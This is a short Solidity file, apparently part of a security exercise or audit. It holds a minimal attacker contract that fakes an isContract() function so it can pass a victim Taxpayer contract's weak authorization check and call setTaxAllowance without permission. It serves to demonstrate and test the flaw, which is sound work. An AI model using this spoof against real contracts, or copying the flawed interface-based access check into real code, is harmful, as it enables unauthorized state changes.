// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "./Taxpayer.sol";

/*
 * minimal attacker contract
 * ------------------------
 *
 * the victim authorizes setTaxAllowance by calling:
 *  - Taxpayer(msg.sender).isContract() OR Lottery(msg.sender).isContract()
 *
 * but any contract can expose an isContract() function returning true,
 * thus spoofing either interface at ABI level.
 */
contract AttackerTaxpayer {
    // spoof both Taxpayer.isContract() and Lottery.isContract() (same selector)
    function isContract() external pure returns (bool) {
        return true;
    }

    // unauthorized call: should be rejected by proper access control, but it is not (before fix)
    function attackSetAllowance(address victim, uint256 x) external {
        Taxpayer(victim).setTaxAllowance(x);
    }
}
